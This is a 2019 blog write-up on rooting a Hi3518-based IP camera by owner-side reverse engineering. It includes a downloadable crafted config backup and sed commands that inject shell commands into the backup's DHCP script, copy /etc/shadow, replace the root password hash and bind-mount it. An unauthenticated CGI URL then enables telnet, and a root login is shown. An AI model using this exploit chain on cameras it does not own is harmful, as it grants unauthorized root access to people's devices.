---
layout: post
title:  Getting into the CTIPC-275C1080P
date:   2019-03-06 16:26:32 -0800
tags:   hi3518 reverse_engineering linux
---
Before we get too far in, I have to say that it feels like someone put some effort into securing this thing.  Let's start with the good:
* Telnet is not running by default
* Enabling debug mode doesn't do anything so far as I can tell
* U-Boot is password protected
* The hardware UART is not labeled and doesn't have a header
* The root password is non-trivial (withstood 24-hrs of `hashcat` and `john`)

Unfortunately, it's not all love and kittens.  There are a couple fatal flaws:
* Telnet can be enabled trivially via an exploit published in 2016 if not earlier
* The configuration backup/restore functionality can be exploited for mostly-arbitrary command execution

## Just let me in

* Log into your camera's web GUI (admin/admin by default)
* Go to Settings -> System -> Initialize
* Restore [this config backup](/assets/config_backup-hipc3518.bin)
* Your camera will reboot and come back up with factory defaults
* Log back into the web GUI (admin/admin)
* Go to Network -> Wireless and connect to any network.  Make sure you use Dynamic IP Address
* Visit [this url](http://ipcam/cgi-bin/hi3510/printscreenrequest.cgi) to enable `telnetd`.
* You can now `telnet` into your camera (root/hipc3518)

## Unlocking the door

There were a lot of false starts and dead ends, but here's the path that got us in:

Start out by resetting factory defaults then downloading the *Backup setting data* from the Settings -> System -> Initialize section of the web GUI.  This will get you your baseline `config_backup.bin`.

`config_backup.bin` is a glorified tarball with 512-bytes of header material that tells the camera that this is a valid backup package.  Stripping off the header, we get a `gzip`ed `tar`ball which includes some DHCP scripts executed by `/bin/sh`.
```
dd bs=512 skip=1 if=config_backup.bin of=config_backup.tgz
```
If you un`tar`, make changes, and re`tar` the archive, something in the binary validation fails, but happily `tar` is just a stream and the DHCP dispatch script contains some comments which can be clobbered in place with `sed` without extracting the archive:
```
#!/bin/sh
# Currently, we only dispatch according to command.  However, a more
# elaborate system might dispatch by command and interface or do some
# common initialization first, especially if more dhcp event notifications
# are added.

exec /mnt/mtd/ipc/conf/udhcpc/default.$1
```
For our first nefarious act, we'll copy `/etc/shadow` into the config directory and give ourselves an `echo` so we can see over serial if it ran:
```
gzip -cd config_backup.tgz |
sed -e 's|# Currently, we only disp|echo "Living the dream" #|' |
sed -e 's|# elaborate system might dispatch b|cp /etc/shadow /mnt/mtd/ipc/conf/ #|' |
gzip -c --best > archive.tgz
```
Now, if you look at `mnt/mtd/ipc/conf/udhcp/default.script` from `archive.tgz`, you'll find:
```
#!/bin/sh
echo "Living the dream" #atch according to command.  However, a more
cp /etc/shadow /mnt/mtd/ipc/conf/ #y command and interface or do some
# common initialization first, especially if more dhcp event notifications
# are added.

exec /mnt/mtd/ipc/conf/udhcpc/default.$1
```
Next, we reassemble the package and upload it to the camera:
```
./config_packer # To be documented
```
The camera will reboot and once it runs its DHCP scripts upon joining the network, we'll have `/etc/shadow` in the config directory.  Download the backup again and save it as `config_backup-shadow.bin` and strip the header as before:
```
dd bs=512 skip=1 if=config_backup-shadow.bin of=config_backup-shadow.tgz
```
you'll find your `/etc/shadow` file:
```
root:$1$ocmTTAhE$v.q2/jwr4BS.20KYshYQZ1:17500:0:99999:7:::
```
Pretty cool, eh?  I burned up several machines for 24-hours working on the hash with `hashcat` and `john` and didn't get anywhere.  Googling it, I just found someone else asking if anyone had broken it.  So much for getting the password easily.

Since we haven't managed to break the hash and `/etc/` is read-only on the device, we'll need to update the `shadow` file in our config directory with a known hash and then `mount --bind` it over the real `/etc/shadow`.
```
gzip -cd config_backup-shadow.tgz |
sed -e 's|$1$ocmTTAhE$v.q2/jwr4BS.20KYshYQZ1|$1$hDwZFK2z$NLzmlcsiUw2zAe8ol1EcI0|' |
sed -e 's|cp /etc/shadow /mnt/mtd/ipc/conf/ #y command and in|mount --bind /mnt/mtd/ipc/conf/shadow /etc/shadow #|' |
gzip -c --best > archive.tgz
```
Now if you look at `archive.tgz`'s `default.script` you'll see:
```
#!/bin/sh
echo "Living the dream" #atch according to command.  However, a more
mount --bind /mnt/mtd/ipc/conf/shadow /etc/shadow #terface or do some
# common initialization first, especially if more dhcp event notifications
# are added.

exec /mnt/mtd/ipc/conf/udhcpc/default.$1
```
...and its `shadow` file:
```
root:$1$hDwZFK2z$NLzmlcsiUw2zAe8ol1EcI0:17500:0:99999:7:::
```
Build and upload the package binary:
```
rcw@xps:~/Projects/ctronics$ ./config_packer
```
Once the camera comes up, enable `telnetd` by visiting `http://ipcam/cgi-bin/hi3510/printscreenrequest.cgi`.  You can now `telnet` into the camera as root/hipc3518:
```
rcw@xps:~/Projects/ctronics$ telnet ipcam
Trying 192.168.0.120...
Connected to ipcam.
Escape character is '^]'.

IPCamera login: root
Password:
Welcome to HiLinux.
~ #
```
